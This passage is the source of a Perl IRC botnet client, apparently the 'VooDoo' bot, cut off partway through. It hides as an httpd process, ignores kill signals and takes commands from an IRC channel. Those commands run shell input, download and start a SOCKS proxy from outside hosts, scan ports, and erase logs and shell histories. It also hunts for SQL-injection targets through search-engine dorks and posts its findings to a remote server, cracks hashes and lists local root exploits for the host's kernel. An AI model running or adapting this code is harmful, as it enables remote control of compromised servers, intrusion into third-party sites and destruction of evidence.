####################################

use HTTP::Request;
use LWP::UserAgent;
my $processo = 'usr/sbin/httpd';
my $linas_max='5';
my $sleep='10';
my $cmd="http://201.218.196.231/fastspread.txt?";
my $id="http://201.218.196.231/fastspread.txt?";
############################################
my @adms=("chireo");
my @canais=("#chireox");
#Put your channel here
my @nickname = ("XB0Tscan-");
my $nick = $nickname[rand scalar @nickname];
#Nickname of bot 
my $ircname ='ivil';
chop (my $realname = 'mack');
#IRC name and Realname 
$servidor='irc.indoirc.net' unless $servidor;
my $porta='6667'; 
my $exploitcounter = 100;
my @User_Agent = &Agent();
############################################
$SIG{'INT'} = 'IGNORE';
$SIG{'HUP'} = 'IGNORE';
$SIG{'TERM'} = 'IGNORE';
$SIG{'CHLD'} = 'IGNORE';
$SIG{'PS'} = 'IGNORE';
use IO::Socket;
use Socket;
use IO::Select;
chdir("/");

#Connect
$servidor="$ARGV[0]" if $ARGV[0];
$0="$processo"."\0"x16;;
my $pid=fork;
exit if $pid;
die "Masalah fork: $!" unless defined($pid);

our %irc_servers;
our %DCC;
my $dcc_sel = new IO::Select->new();
$sel_cliente = IO::Select->new();
sub sendraw {
	if ($#_ == '1') {
		my $socket = $_[0];
		print $socket "$_[1]\n";

	} else {
		print $IRC_cur_socket "$_[0]\n";
	}
}

sub conectar {
	my $meunick = $_[0];
	my $servidor_con = $_[1];
	my $porta_con = $_[2];

	my $IRC_socket = IO::Socket::INET->new(Proto=>"tcp", PeerAddr=>"$servidor_con",
	PeerPort=>$porta_con) or return(1);
	if (defined($IRC_socket)) {
		$IRC_cur_socket = $IRC_socket;
		$IRC_socket->autoflush(1);
		$sel_cliente->add($IRC_socket);
		$irc_servers{$IRC_cur_socket}{'host'} = "$servidor_con";
		$irc_servers{$IRC_cur_socket}{'porta'} = "$porta_con";
		$irc_servers{$IRC_cur_socket}{'nick'} = $meunick;
		$irc_servers{$IRC_cur_socket}{'meuip'} = $IRC_socket->sockhost;
		nick("$meunick");
		sendraw("USER $ircname ".$IRC_socket->sockhost." $servidor_con :$realname");
		sleep 1;
	}
}

my $line_temp;
while( 1 ) {
	while (!(keys(%irc_servers))) { conectar("$nick", "$servidor", "$porta"); }
#	select(undef, undef, undef, 0.01); #sleeping for a fraction of a second keeps the script from running to 100 cpu usage ^_^
	delete($irc_servers{''}) if (defined($irc_servers{''}));
	my @ready = $sel_cliente->can_read(0);
	next unless(@ready);
	foreach $fh (@ready) {
		$IRC_cur_socket = $fh;
		$meunick = $irc_servers{$IRC_cur_socket}{'nick'};
		$nread = sysread($fh, $msg, 4096);
		if ($nread == 0) {
			$sel_cliente->remove($fh);
			$fh->close;
			delete($irc_servers{$fh});
		}
		@lines = split (/\n/, $msg);
		for(my $c=0; $c<= $#lines; $c++) {
			$line = $lines[$c];
			$line=$line_temp.$line if ($line_temp);
			$line_temp='';
			$line =~ s/\r$//;
			unless ($c == $#lines) {
				parse("$line");
			} else {
				if ($#lines == 0) {
					parse("$line");
				} elsif ($lines[$c] =~ /\r$/) {
					parse("$line");
				} elsif ($line =~ /^(\S+) NOTICE AUTH :\*\*\*/) {
					parse("$line"); 
				} else {
					$line_temp = $line;
				}
			}
		}
	}
}

sub parse {
	my $servarg = shift;
	if ($servarg =~ /^PING \:(.*)/) {
		sendraw("PONG :$1");
	} elsif ($servarg =~ /^\:(.+?)\!(.+?)\@(.+?) PRIVMSG (.+?) \:(.+)/) {
		my $pn=$1; my $hostmask= $3; my $onde = $4; my $args = $5;
		if ($args =~ /^\001VERSION\001$/) {
			notice("$pn", "\001VERSION mIRC v6.17 VooDoo\001");
		}
		if (grep {$_ =~ /^\Q$pn\E$/i } @adms ) {
			if ($onde eq "$meunick"){
				shell("$pn", "$args");
			}
#End of Connect
			if ($args =~ /^(\Q$meunick\E|\!x)\s+(.*)/ ) {
				my $natrix = $1;
				my $arg = $2;
				if ($arg =~ /^\!(.*)/) {
					ircase("$pn","$onde","$1") unless ($natrix eq "!x" and $arg =~ /^\!nick/);
				} elsif ($arg =~ /^\@(.*)/) {
					$ondep = $onde;
					$ondep = $pn if $onde eq $meunick;
					bfunc("$ondep","$1");
				} else {
					shell("$onde", "$arg");
				}
			}
		}
	}
######################### End of prefix
	elsif ($servarg =~ /^\:(.+?)\!(.+?)\@(.+?)\s+NICK\s+\:(\S+)/i) {
		if (lc($1) eq lc($meunick)) {
			$meunick=$4;
			$irc_servers{$IRC_cur_socket}{'nick'} = $meunick;
		}
	} elsif ($servarg =~ m/^\:(.+?)\s+433/i) {
		nick("$meunick|".int rand(999999));
	} elsif ($servarg =~ m/^\:(.+?)\s+001\s+(\S+)\s/i) {
		$meunick = $2;
		$irc_servers{$IRC_cur_socket}{'nick'} = $meunick;
		$irc_servers{$IRC_cur_socket}{'nome'} = "$1";
		foreach my $canal (@canais) {
			sendraw("JOIN $canal $key");
		}
	}
}

sub bfunc {
	my $printl = $_[0];
	my $funcarg = $_[1];
	if (my $pid = fork) {
		waitpid($pid, 0);
	} else {
		if (fork) {
			exit;
		} else {

			if ($funcarg =~ /^killme/) {
				sendraw($IRC_cur_socket, "QUIT :");
				$killd = "kill -9 ".fork;
				system (`$killd`);
			}
######################
#     Commands       #
######################
if ($funcarg =~ /^hello/) {
sendraw($IRC_cur_socket, "PRIVMSG $printl :[Voo|Doo] WAZaaaaaaaa !");
}

if ($funcarg =~ /^c99/) {
sendraw($IRC_cur_socket, "PRIVMSG $printl :[Voo|Doo] http://no-hack.net/shells/c99.txt !");
sendraw($IRC_cur_socket, "PRIVMSG $printl :[Voo|Doo] http://www.topnlpsites.com/images/gif/c99.txt !");
sendraw($IRC_cur_socket, "PRIVMSG $printl :[Voo|Doo] http://www.avramovic.info/razno/c99.txt !");
sendraw($IRC_cur_socket, "PRIVMSG $printl :[Voo|Doo] http://usuarios.lycos.es/lannetboy/shells/c99.txt !");
}

if ($funcarg =~ /^r57/) {
sendraw($IRC_cur_socket, "PRIVMSG $printl :[Voo|Doo] http://www.army5.com.br/r57.txt !");
sendraw($IRC_cur_socket, "PRIVMSG $printl :[Voo|Doo] http://www.id-nobody.com/shell/r57.txt !");
sendraw($IRC_cur_socket, "PRIVMSG $printl :[Voo|Doo] http://system-nemesis.us/shell/r57.txt !");
sendraw($IRC_cur_socket, "PRIVMSG $printl :[Voo|Doo] http://no-hack.net/shells/r57.txt !");
}
if ($funcarg =~ /^md5 (.*)/) {
$md5=$1;
my @gdataonline=gdataonline($md5);
my @cry=cry($md5);
my @alim=alim($md5);
my @xpz=xpz($md5);
my @rend=rend($md5);
my @ice=ice($md5);

}

sub ice(){
$hashget = LWP::UserAgent->new;
$resp = $hashget->get("http://ice.breaker.free.fr/md5.php?hash=$md5"); # checks gdata for hash
  $hashans = $resp->content;
  if ($hashans =~ m/<b><br><br> - (.*?)<br><br><br>/g){
     $crack = $1;
sendraw($IRC_cur_socket, "PRIVMSG $printl :[Voo|Doo]ice.breaker.free.fr  : $crack");
}else{
sendraw($IRC_cur_socket, "PRIVMSG $printl :[Voo|Doo]ice.breaker.free.fr  : Hash Not Found.");
}
}

sub rend(){
$hashget = LWP::UserAgent->new;
$resp = $hashget->get("http://md5.rednoize.com/?p&s=md5&q=$md5"); # checks gdata for hash
  $hashans = $resp->content;
  if ($hashans =~ m/<(.*)/g){
     $crack = $1;
sendraw($IRC_cur_socket, "PRIVMSG $printl :[Voo|Doo]md5.rednoize.com     : $crack");
}else{
sendraw($IRC_cur_socket, "PRIVMSG $printl :[Voo|Doo]md5.rednoize.com     : Hash Not Found.");
}
}


sub xpz(){
$hashget = LWP::UserAgent->new;
$resp = $hashget->get("http://md5.xpzone.de/?string=".$md5."&mode=decrypt"); # checks gdata for hash
  $hashans = $resp->content;
  if ($hashans =~ m/Code: <b>(.*)<\/b><br>/g){
     $crack = $1;
sendraw($IRC_cur_socket, "PRIVMSG $printl :[Voo|Doo]md5.xpzone.de        : $crack");
}else{
sendraw($IRC_cur_socket, "PRIVMSG $printl :[Voo|Doo]md5.xpzone.de        : Hash Not Found.");
}
}


sub ben(){
$hashget = LWP::UserAgent->new;
$resp = $hashget->get("http://md5.benramsey.com/md5.php?hash=$md5"); # checks gdata for hash
  $hashans = $resp->content;
  if ($hashans =~ m/<string><\!\[CDATA\[(.+?)\]\]><\/string>/g){
     $crack = $1;
sendraw($IRC_cur_socket, "PRIVMSG $printl :[Voo|Doo]md5.benramsey.com    : $crack");
}else{
sendraw($IRC_cur_socket, "PRIVMSG $printl :[Voo|Doo]md5.benramsey.com    : Hash Not Found.");
}
}


sub alim(){
$hashget = LWP::UserAgent->new;
$resp = $hashget->get("http://alimamed.pp.ru/md5/?md5e=&md5d=$md5"); # checks gdata for hash
  $hashans = $resp->content;
  if ($hashans =~ m/<b>(.+?)<\/b>/g){
     $crack = $1;
sendraw($IRC_cur_socket, "PRIVMSG $printl :[Voo|Doo]alimamed.pp.ru       : $crack");
}else{
sendraw($IRC_cur_socket, "PRIVMSG $printl :[Voo|Doo]alimamed.pp.ru       : Hash Not Found.");
}
}


sub cry(){
$hashget = LWP::UserAgent->new;
$resp = $hashget->get("http://us.md5.crysm.net/find?md5=$md5"); # checks gdata for hash
  $hashans = $resp->content;
  if ($hashans =~ m/<li>(.+?)<\/li>/g){
     $crack = $1;
sendraw($IRC_cur_socket, "PRIVMSG $printl :[Voo|Doo]us.md5.crysm.net     : $crack");
}else{
sendraw($IRC_cur_socket, "PRIVMSG $printl :[Voo|Doo]us.md5.crysm.net     : Hash Not Found.");
}
}


sub gdataonline(){
$hashget = LWP::UserAgent->new;
$resp = $hashget->get("http://gdataonline.com/qkhash.php?mode=txt&hash=$md5"); # checks gdata for hash
  $hashans = $resp->content;
  if (
$hashans =~ m\width="35%"><b>([  -_a-z0-9.*?&=;<>/""]{1,25})</b></td>\
)

{
     $crack = $1;
sendraw($IRC_cur_socket, "PRIVMSG $printl :[Voo|Doo]gdataonline.com      : $crack");
}else{
sendraw($IRC_cur_socket, "PRIVMSG $printl :[Voo|Doo]gdataonline.com      : Hash Not Found");
}
}




			if ($funcarg =~ /^milw0rm/) {
				my @ltt=();
				my @bug=();
				my $x;
				my $page="";
				my $socke = IO::Socket::INET->new(PeerAddr=>"milw0rm.com",PeerPort=>"80",Proto=>"tcp") or return;
				print $socke "GET http://milw0rm.com/rss.php HTTP/1.0\r\nHost: milw0rm.com\r\nAccept: */*\r\nUser-Agent: Mozilla/5.0\r\n\r\n";
				my @r = <$socke>;
				$page="@r";
				close($socke);
				while ($page =~  m/<title>(.*)</g){
					$x = $1;
					if ($x =~ /\&lt\;/) {
						$x =~ s/\&lt\;/</g;
					}			
					if ($x !~ /milw0rm/) {
						push (@bug,$x);
					}
				}
				while ($page =~  m/<link.*expl.*([0-9]...)</g) {
					if ($1 !~ m/milw0rm.com|exploits|en/){
						push (@ltt,"http://www.milw0rm.com/exploits/$1 ");
					}
				}
				sendraw($IRC_cur_socket, "PRIVMSG $printl :9 [Milw0rm] 9:.4 Latest exploits :");
				foreach $x (0..(@ltt - 1)) {
					sendraw($IRC_cur_socket, "PRIVMSG $printl :9 [Milw0rm] 9:.4  $bug[$x] - $ltt[$x]");
					sleep 1;
				}
			}

#####################
# Chk The News PacketStorm#
######################
if ($funcarg =~ /^packetstorm/) { 
	my $c=0;
	my $x;
	my @ttt=();
	my @ttt1=(); 
	my $sock = IO::Socket::INET->new(PeerAddr=>"www.packetstormsecurity.org",PeerPort=>"80",Proto=>"tcp") or return; 
	print $sock "GET /whatsnew20.xml HTTP/1.0\r\n";
	print $sock "Host: www.packetstormsecurity.org\r\n";
	print $sock "Accept: */*\r\n";
	print $sock "User-Agent: Mozilla/5.0\r\n\r\n"; 
	my @r = <$sock>;
	$page="@r";
	close($sock);
	while ($page =~  m/<link>(.*)<\/link>/g)
	{
     		push(@ttt,$1);
	}
	while ($page =~  m/<description>(.*)<\/description>/g)
	{ 
    		push(@ttt1,$1);
	}
	foreach $x (0..(@ttt - 1))
	{
			sendraw($IRC_cur_socket, "PRIVMSG $printl :[Voo|Doo] ".$ttt[$x]." ".$ttt1[$x]."");
		sleep 3;
		$c++;
	}
}
######################
#Auto Install Socks V5 using Mocks#
######################
if ($funcarg =~ /^socks5/) {
	sendraw($IRC_cur_socket, "PRIVMSG $printl :[Voo|Doo] Installing Mocks please wait4");
		system 'cd /tmp';
		system 'wget http://switch.dl.sourceforge.net/sourceforge/mocks/mocks-0.0.2.tar.gz';
		system 'tar -xvfz mocks-0.0.2.tar.gz';
		system 'rm -rf mocks-0.0.2.tar.gz';
		system 'cd mocks-0.0.2';
		system 'rm -rf mocks.conf';
		system 'curl -O http://andromeda.covers.de/221/mocks.conf';
		system 'touch mocks.log';
		system 'chmod 0 mocks.log';
			sleep(2);
		system './mocks start';
			sleep(4);
		sendraw($IRC_cur_socket, "PRIVMSG $printl :[Voo|Doo] Looks like its succesfully installed lets do the last things4	");

		#lets grab ip
		$net = `/sbin/ifconfig | grep 'eth0'`;
		if (length($net))
		{
		$net = `/sbin/ifconfig eth0 | grep 'inet addr'`;
		if (!length($net))
		{
		$net = `/sbin/ifconfig eth0 | grep 'inet end.'`;
		}
			if (length($net))
		{
			chop($net);
			@netip = split/:/,$net;
			$netip[1] =~ /(\d{1,3}).(\d{1,3}).(\d{1,3}).(\d{1,3})/;
			$ip = $1 .".". $2 .".". $3 .".". $4;
			
				#and print it ^^	
				sendraw($IRC_cur_socket, "PRIVMSG $printl :[Voo|Doo] Connect here ". $ip .":8787 ");
			}
		else
	{
		sendraw($IRC_cur_socket, "PRIVMSG $printl :[Voo|Doo] IP not founded ");
	}
}
else
{
		sendraw($IRC_cur_socket, "PRIVMSG $printl :[Voo|Doo] ERROR WHILE INSTALLING MOCKS ");
}
}
######################
#        Nmap        # 
######################
   if ($funcarg =~ /^nmap\s+(.*)\s+(\d+)\s+(\d+)/){
         my $hostip="$1";
         my $portstart = "$2";
         my $portend = "$3";
         my (@abertas, %porta_banner);
       sendraw($IRC_cur_socket, "PRIVMSG $printl :[Voo|Doo] Port Scan $2-$3");
       foreach my $porta ($portstart..$portend){
               my $scansock = IO::Socket::INET->new(PeerAddr => $hostip, PeerPort => $porta, Proto => 'tcp', Timeout => $portime);
    if ($scansock) {
                 push (@abertas, $porta);
                 $scansock->close;
                 if ($xstats){
        sendraw($IRC_cur_socket, "PRIVMSG $printl :[Voo|Doo] Port-Scan: $porta"."/Open");
                 }
               }
             }
             if (@abertas) {
        sendraw($IRC_cur_socket, "PRIVMSG $printl :[Voo|Doo] Port-Scan Complete ");
             } else {
        sendraw($IRC_cur_socket, "PRIVMSG $printl :[Voo|Doo] No open ports have been founded ");
             }
          }
######################
#    End of Nmap     # 
######################

if ($funcarg =~ /^killproc\s+(\d+)/){

		$proc=$1;
		open(FILE,"/tmp/pids");
		while(<FILE>) {
			$_ =~ /(\d+)\s+(.*)/;
			$childs{$1}=$2;
		}
		close(FILE);
		if(defined $childs{$proc}) {
			delproc($proc);
			`kill -9 $proc`;
			sendraw($IRC_cur_socket, "PRIVMSG $printl : [Voo|Doo] Zabijam proces [ $proc ]   ");
		} else {
			sendraw($IRC_cur_socket, "PRIVMSG $printl : [Voo|Doo] Niema takiego procesu ");
		}
}

# wyswietla procesy skanowania
if ($funcarg =~ /^procslist/){

	open(FILE,"/tmp/pids");
	while(<FILE>) {
		$_ =~ /(\d+)\s+(.*)/;
		$childs{$1}=$2;
	}
	close(FILE);
	if(scalar keys %childs > 0) {
		for $klucz (keys %childs) {
				sendraw($IRC_cur_socket, "PRIVMSG $printl : [Voo|Doo] Proces [ $klucz ]  By [ $childs{$klucz} ]   "); 
		}
	} else {
				sendraw($IRC_cur_socket, "PRIVMSG $printl : [Voo|Doo] Brak procesow"); 
	}
}

######################
#    Log Cleaner     # 
######################
if ($funcarg =~ /^logcleaner/) {
sendraw($IRC_cur_socket, "PRIVMSG $printl :[Voo|Doo] Log Clean.  This process can be long, just wait");
    system 'rm -rf /var/log/lastlog';
    system 'rm -rf /var/log/wtmp';
   system 'rm -rf /etc/wtmp';
   system 'rm -rf /var/run/utmp';
   system 'rm -rf /etc/utmp';
   system 'rm -rf /var/log';
   system 'rm -rf /var/logs';
   system 'rm -rf /var/adm';
   system 'rm -rf /var/apache/log';
   system 'rm -rf /var/apache/logs';
   system 'rm -rf /usr/local/apache/log';
   system 'rm -rf /usr/local/apache/logs';
   system 'rm -rf /root/.bash_history';
   system 'rm -rf /root/.ksh_history';
sendraw($IRC_cur_socket, "PRIVMSG $printl :[Voo|Doo] Log Clean.  All default log and bash_history files erased");
      sleep 1;
sendraw($IRC_cur_socket, "PRIVMSG $printl :[Voo|Doo] Log Clean.  Now Erasing the rest of the machine log files");
   system 'find / -name *.bash_history -exec rm -rf {} \;';
   system 'find / -name *.bash_logout -exec rm -rf {} \;';
   system 'find / -name "log*" -exec rm -rf {} \;';
   system 'find / -name *.log -exec rm -rf {} \;';
      sleep 1;
sendraw($IRC_cur_socket, "PRIVMSG $printl :[Voo|Doo] Log Clean.  Done! All logs erased");
      }
######################
# End of Log Cleaner # 
######################
######################
#              SQL SCANNER              #
######################
if ($funcarg =~ /^sql2\s+(.*?)\s+(.*)\s+(\d+)/){
	if (my $pid = fork) {
	waitpid($pid, 0);
	} else {
		if (my $d=fork()) {
			addproc($d,"[SQL2] $2");
			exit;
		} else {
						
			my $bug=$1;
			my $dork=$2;
			my $contatore=0;
			my ($type,$space);
			my %hosts;
			my $columns=$3;

&Find($dork);
	my @links = &GetLink();
	sendraw($IRC_cur_socket, "PRIVMSG $printl :[Voo|Doo] Stron : ".scalar(@links));
	my @uni = &Unique(@links);
	sendraw($IRC_cur_socket, "PRIVMSG $printl :[Voo|Doo] Wyczyszczono : ".scalar(@uni));
	&Remove();
	 
						foreach my $sito (@uni) {
		  		
						$contatore++;
		  				if ($contatore==$uni-1){
							sendraw($IRC_cur_socket, "PRIVMSG $printl :[Voo|Doo]End: $bug $chiave ");
		  				}	

		  				my $site="http://".$sito.$bug;
						#sendraw($IRC_cur_socket, "PRIVMSG $printl :Sprawdzam: $site cols: $columns ");
			
			$w=int rand(999);	
			$w=$w*1000;
			for($i=1;$i<=$columns;$i++) {
				splice(@col,0,$#col+1);
				for($j=1;$j<=$i;$j++) {
					push(@col,$w+$j);
				}	
				$tmp=join(",",@col);
				$test=$site."-1+UNION+SELECT+".$tmp."/*";
				print $test."\n";
				$result=&Query($test,"3");
				$result =~ s/\/\*\*\///g;
				$result =~ s/UNION([^(\*)]*)//g;
				for($k=1;$k<=$i;$k++) {
					$n=$w+$k;
						if($result =~ /$n/){
							splice(@col2,0,$#col2+1);
								for($s=1;$s<=$i;$s++) {
									push(@col2,$s); 
								}
							$tmp2=join(",",@col2);
							$test2="+UNION+SELECT+".$tmp2."/*";
							push @{$dane{$test2}},$k;
						} 
				}
			}
			for $klucz (keys %dane) {
				foreach $i(@{$dane{$klucz}}) {
					$klucz =~ s/$i/$i/;
				}
				$ssij = $site."-1".$klucz;
				sendraw($IRC_cur_socket, "PRIVMSG $printl :[Voo|Doo] ".$ssij." ");
				my $ua = LWP::UserAgent->new();
				$ua->agent('Mozilla/5.0');
				my %form = ('sqlbug' => $ssij,);
				my $response = $ua->post('http://showtime.boo.pl/index.php', \%form);
		}
			%dane=();
			#sendraw($IRC_cur_socket, "PRIVMSG @zut :[Voo|Doo] End. ");			
      		}
		}
	delproc($$);
	exit;
	}
}
}
#######  SQL SCANNER  #########

if ($funcarg =~ /^string\s+(.*)\s+http\:\/\/(.*?)\/(.*?)\s+(\d+)/){
if (my $pid = fork) {
waitpid($pid, 0);
} else {
if (my $d=fork()) {
addproc($d,"[String] $2");
exit;
} else {
		$kto = $1;
		$host = $2;
		$skrypt = $3;
		$czekac=$4;
		
		#http://ttl.ugu.pl/string/index.php
		my $socke = IO::Socket::INET->new(PeerAddr=>$host,PeerPort=>"80",Proto=>"tcp") or return;
	   print $socke "GET /$skrypt HTTP/1.0\r\nHost: $host\r\nAccept: */*\r\nUser-Agent: Mozilla/5.0\r\n\r\n";
	   
		my @r = <$socke>;
		$page="@r";
	
		$page =~ s/!scan(\s+)//g;
		$page =~ s/!scan(.)//g;
		$page =~ s/\<.*\>//g;
		
		@lines = split (/\n/, $page);
		$ile=scalar(@lines);
				
		
		for($i=9;$i<=$ile;$i+=4) {

			for($j=0;$j<4;$j++) {
				#print $lines[$i+$j]."\n";
				
				sendraw($IRC_cur_socket, "PRIVMSG $printl :$kto $lines[$i+$j]");
				
				sleep 10;
			}
			
			sleep $czekac*60;
		}

	}
		delproc($$);
		exit;
	}
}





#######  SQL SCANNER  #########

if ($funcarg =~ /^sql\s+(.*)\s+(\d+)/){
	if (my $pid = fork()) {
		waitpid($pid, 0);
	} else {
		if (my $d=fork()) {
			addproc($d,"[SQL1] $1 $2");
			exit;
		} else {
			my $site=$1;
			my $columns=$2;
			sendraw($IRC_cur_socket, "PRIVMSG $printl :[Voo|Doo] Sql [Testing]: $site cols:  $columns ");
			
			$w=int rand(999);	
			$w=$w*1000;
			for($i=1;$i<=$columns;$i++) {
				splice(@col,0,$#col+1);
				for($j=1;$j<=$i;$j++) {
					push(@col,$w+$j);
				}	
				$tmp=join(",",@col);
				$test=$site.$bug."-1'+UNION+SELECT+".$tmp."/*";
								#$result=query($test);
				$result=get_html($test);
	
				$result =~ s/\/\*\*\///g;
				$result =~ s/UNION([^(\*)]*)//g;
				for($k=1;$k<=$i;$k++) {
					$n=$w+$k;
						if($result =~ /$n/){
							splice(@col2,0,$#col2+1);
								for($s=1;$s<=$i;$s++) {
									push(@col2,$s); 
								}
							$tmp2=join(",",@col2);
							$test2="+UNION+SELECT+".$tmp2."/*";
							push @{$dane{$test2}},$k;
						} 
				}
			}
			for $klucz (keys %dane) {
				foreach $i(@{$dane{$klucz}}) {
					$klucz =~ s/$i/$i/;
				}
				sendraw($IRC_cur_socket, "PRIVMSG $printl :[Voo|Doo] Sql [Sql-Bug]:  ".$site.$bug."-1".$klucz." ");
			}
		#	sendraw($IRC_cur_socket, "PRIVMSG $printl :4,16 [ sql ] [ 12Koniec 4 ] ");		
		}
	delproc($$);
	exit;
	}
}
#######  SQL SCANNER  #########
######################
#        Rootable                                     #
######################
if ($funcarg =~ /^rootable/) { 
my $khost = `uname -r`;
my $currentid = `whoami`;
sendraw($IRC_cur_socket, "PRIVMSG $printl :[Voo|Doo] Currently you are ".$currentid." ");
sendraw($IRC_cur_socket, "PRIVMSG $printl :[Voo|Doo] The kernel of this box is ".$khost." ");
chomp($khost);

	my %h;
	$h{'w00t'} = { 
		vuln=>['2.4.18','2.4.10','2.4.21','2.4.19','2.4.17','2.4.16','2.4.20'] 
	};
	
	$h{'brk'} = {
		vuln=>['2.4.22','2.4.21','2.4.10','2.4.20'] 
	};
	
	$h{'ave'} = {
		vuln=>['2.4.19','2.4.20'] 
	};
	
	$h{'elflbl'} = {
		vuln=>['2.4.29'] 
	};
	
	$h{'elfdump'} = {
		vuln=>['2.4.27']
	};
	
	$h{'expand_stack'} = {
		vuln=>['2.4.29'] 
	};
	
	$h{'h00lyshit'} = {
		vuln=>['2.6.8','2.6.10','2.6.11','2.6.9','2.6.7','2.6.13','2.6.14','2.6.15','2.6.16','2.6.2']
	};
	
	$h{'kdump'} = {
		vuln=>['2.6.13'] 
	};
	
	$h{'km2'} = {
		vuln=>['2.4.18','2.4.22']
	};
	
	$h{'krad'} = {
		vuln=>['2.6.11']
	};
	
	$h{'krad3'} = {
		vuln=>['2.6.11','2.6.9']
	};
	
	$h{'local26'} = {
		vuln=>['2.6.13']
	};
	
	$h{'loko'} = {
		vuln=>['2.4.22','2.4.23','2.4.24'] 
	};
	
	$h{'mremap_pte'} = {
		vuln=>['2.4.20','2.2.25','2.4.24'] 
	};
	
	$h{'newlocal'} = {
		vuln=>['2.4.17','2.4.19','2.4.18'] 
	};
	
	$h{'ong_bak'} = {
		vuln=>['2.4.','2.6.'] 
	};
	
	$h{'ptrace'} = {
		vuln=>['2.2.','2.4.22'] 
	};
	
	$h{'ptrace_kmod'} = {
		vuln=>['2.4.2'] 
	};
	
	$h{'ptrace24'} = {
		vuln=>['2.4.9'] 
	};
	$h{'pwned'} = {
		vuln=>['2.4.','2.6.'] 
	};
	$h{'py2'} = {
		vuln=>['2.6.9','2.6.17','2.6.15','2.6.13'] 
	};
	$h{'raptor_prctl'} = {
		vuln=>['2.6.13','2.6.17','2.6.16','2.6.13'] 
	};
	$h{'prctl3'} = {
		vuln=>['2.6.13','2.6.17','2.6.9'] 
	};
	$h{'remap'} = {
		vuln=>['2.4.'] 
	};
	$h{'rip'} = {
		vuln=>['2.2.'] 
	};
	$h{'stackgrow2'} = {
		vuln=>['2.4.29','2.6.10'] 
	};
	$h{'uselib24'} = {
		vuln=>['2.4.29','2.6.10','2.4.22','2.4.25'] 
	};
	$h{'newsmp'} = {
		vuln=>['2.6.'] 
	};
	$h{'smpracer'} = {
		vuln=>['2.4.29'] 
	};
	$h{'loginx'} = {
		vuln=>['2.4.22'] 
	};
	$h{'exp.sh'} = {
		vuln=>['2.6.9','2.6.10','2.6.16','2.6.13'] 
	};
	$h{'prctl'} = {
		vuln=>['2.6.'] 
	};
	$h{'kmdx'} = {
		vuln=>['2.6.','2.4.'] 
	};
	$h{'raptor'} = {
		vuln=>['2.6.13','2.6.14','2.6.15','2.6.16'] 
	};
	$h{'raptor2'} = {
		vuln=>['2.6.13','2.6.14','2.6.15','2.6.16'] 
	};
foreach my $key(keys %h){
foreach my $kernel ( @{ $h{$key}{'vuln'} } ){ 
	if($khost=~/^$kernel/){
	chop($kernel) if ($kernel=~/.$/);
	sendraw($IRC_cur_socket, "PRIVMSG $printl :[Voo|Doo] Possible Local Root Exploits: ". $key ." ");
		}
	}
}
}
######################
#       MAILER       # 
######################
if ($funcarg =~ /^sendmail\s+(.*)\s+(.*)\s+(.*)\s+(.*)/) {
sendraw($IRC_cur_socket, "PRIVMSG $printl :[Voo|Doo] Mailer |  Sending Mail to : 2 $3");
$subject = $1;
$sender = $2;
$recipient = $3;
@corpo = $4;
$mailtype = "content-type: text/html";
$sendmail = '/usr/sbin/sendmail';
open (SENDMAIL, "| $sendmail -t");
print SENDMAIL "$mailtype\n";
print SENDMAIL "Subject: $subject\n";
print SENDMAIL "From: $sender\n";
print SENDMAIL "To: $recipient\n\n";
print SENDMAIL "@corpo\n\n";
close (SENDMAIL);
sendraw($IRC_cur_socket, "PRIVMSG $printl :[Voo|Doo] Mailer |  Mail Sent To : 2 $recipient");
}
######################
#   End of MAILER    # 
######################
my $responselfi = "./../../../../../../../../etc/passwd";
my $printcmdlfi = "./../../../../../../../../etc/passwd";

if ($funcarg =~ /^auto\s+(.*?)\s+(.*)/){
	if(fork() == 0){
if (my $d=fork()) {
addproc($d,"[Autoscan] $2");
exit;
}
		my($bug,$dork)=($1,$2);
		&autoscan($bug,$dork);
			delproc($$);
			exit(0);
	}
}

sub autoscan(){
	my @domini = &SiteDomains();
	my($bug,$dork)=@_;
	$dork =~ s/[\r\n]//g;
	sendraw($IRC_cur_socket, "PRIVMSG $printl :[Voo|Doo] Scan Start ".$dork);
	if($dork =~ /site:/){
	sendraw($IRC_cur_socket, "PRIVMSG $printl :[Voo|Doo] Zakazany Dork.");
		exit(0);
	}
	foreach my $Domains(@domini){
		my $auto_dork = $dork."+site:".$Domains;
		sendraw($IRC_cur_socket, "PRIVMSG $printl :[Voo|Doo] Skanuje :".$auto_dork);
		&Find($auto_dork);
		&Test($bug);
	sendraw($IRC_cur_socket, "PRIVMSG $printl :[Voo|Doo] Scan End: ".$dork);
	}
}
sub Find(){
	my $dork = $_[0];
	my @proc;
	$proc[0] = fork();
	if($proc[0] == 0){
		sendraw($IRC_cur_socket, "PRIVMSG $printl :[Voo|Doo] Google : ".scalar(&Google($dork)));
		exit;
	}
	$proc[1] = fork();
	if($proc[1] == 0){
		sendraw($IRC_cur_socket, "PRIVMSG $printl :[Voo|Doo] Yahoo : ".scalar(&Yahoo($dork)));
		exit;
	}
	$proc[2] = fork();
	if($proc[2] == 0){
		sendraw($IRC_cur_socket, "PRIVMSG $printl :[Voo|Doo] Baidu : ".scalar(&baidu($dork)));
		exit;
	}
	$proc[3] = fork();
	if($proc[3] == 0){
		sendraw($IRC_cur_socket, "PRIVMSG $printl :[Voo|Doo] Gigablast : ".scalar(&Gigablast($dork)));
		exit;
	}
	$proc[4] = fork();
	if($proc[4] == 0){
			sendraw($IRC_cur_socket, "PRIVMSG $printl :[Voo|Doo] Msn : ".scalar(&MSN($dork)));
		exit;
	}
	$proc[5] = fork();
	if($proc[5] == 0){
			sendraw($IRC_cur_socket, "PRIVMSG $printl :[Voo|Doo] Aol : ".scalar(&Aol($dork)));
		exit;
	}
	$proc[6] = fork();
	if($proc[6] == 0){
		sendraw($IRC_cur_socket, "PRIVMSG $printl :[Voo|Doo] AltaVista :  ".scalar(&AltaVista($dork)));
		exit;
	}
	$proc[7] = fork();
	if($proc[7] == 0){
		sendraw($IRC_cur_socket, "PRIVMSG $printl :[Voo|Doo] Alltheweb : ".scalar(&Alltheweb($dork)));
		exit;
	}
	$proc[8] = fork();
	if($proc[8] == 0){
		sendraw($IRC_cur_socket, "PRIVMSG $printl :[Voo|Doo] Fireball : ".scalar(&fire($dork)));
		exit;
	}
	$proc[9] = fork();
	if($proc[9] == 0){
		sendraw($IRC_cur_socket, "PRIVMSG $printl :[Voo|Doo] Uol : ".scalar(&UOL($dork)));
		exit;
	}

	waitpid($proc[0],0);
	waitpid($proc[1],0);
	waitpid($proc[2],0);
	waitpid($proc[3],0);
	waitpid($proc[4],0);
	waitpid($proc[5],0);
	waitpid($proc[6],0);
	waitpid($proc[7],0);
	waitpid($proc[8],0);
	waitpid($proc[9],0);
}
sub Test(){
	my $counter = 0;
